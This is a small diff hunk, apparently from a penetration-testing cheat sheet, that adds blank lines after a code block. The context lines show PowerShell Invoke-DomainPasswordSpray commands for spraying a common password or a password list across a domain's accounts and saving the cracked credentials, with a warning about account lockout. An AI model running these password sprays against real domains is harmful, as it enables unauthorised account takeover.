@@ -17,3 +17,5 @@ Invoke-DomainPasswordSpray -Password Summer2021!
 # /!\ be careful with the account lockout !
 Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
 ```
+
+
